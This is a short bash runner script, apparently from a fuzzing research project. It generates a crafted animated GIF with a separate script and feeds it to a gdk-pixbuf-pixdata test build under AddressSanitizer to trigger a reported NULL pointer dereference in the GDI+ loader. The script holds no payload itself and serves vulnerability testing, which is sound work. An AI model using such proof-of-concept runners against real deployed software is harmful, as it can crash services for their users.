#!/bin/bash
# vuln_002_run.sh
# PoC runner for VULN 002 – NULL Pointer Dereference via unchecked g_try_malloc
# in GDI+ property access functions (io-gdip-utils.c lines 494, 524, 411).
#
# Expected outcome: the binary reports an unrecognised image format because this
# Linux build of gdk-pixbuf only includes the pixdata loader (no GDI+/GIF support).

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_io-gdip-animation_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"

echo "[*] Generating crafted animated GIF ..."
python3 "$POC_DIR/vuln_002_gen.py"

echo "[*] Running gdk-pixbuf-pixdata against vuln_002.gif ..."
ASAN_OPTIONS="abort_on_error=0:log_path=$POC_DIR/asan.log" \
  "$BINARY" "$POC_DIR/vuln_002.gif" "$POC_DIR/vuln_002_out.c" \
  > "$POC_DIR/vuln_002_result.txt" 2>&1 || true

echo "[*] Output saved to $POC_DIR/vuln_002_result.txt"
cat "$POC_DIR/vuln_002_result.txt"
